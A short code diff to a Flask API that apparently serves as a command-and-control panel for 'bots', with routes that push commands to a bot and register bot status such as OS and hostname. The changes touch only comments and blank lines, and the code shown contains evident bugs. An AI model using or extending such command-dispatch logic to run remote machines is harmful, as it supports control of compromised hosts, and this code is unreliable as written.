@@ -23,16 +23,18 @@ def push(bot_id):
 		abort(404)
 	bot.push(request.form['cmd'])
 	return ''	
+
+
 #API call to check status of a bot
 @api.route('/<bot_id>/status', methods=['post'])
 def get_status(bot_id):
 	bot = Bot.query.get(bot_id)			#set bot equal to var
-	if not bot:							#if doesnt exist then create new bot obj and add to db
+	if not bot:							#if doesnt exist then create new bot obj and add to db (new bot)
 		bot = Bot(bot_id)				
 		db.session.add(bot_id)
 		db.session.commit()
 	info = request.json					#api call by post with json obj, update the db with the json obj
-	if info:
+	if info:							#updates bot info each time 
 		if 'os' in info:
 			bot.os = os
 		if 'hostname' in info:
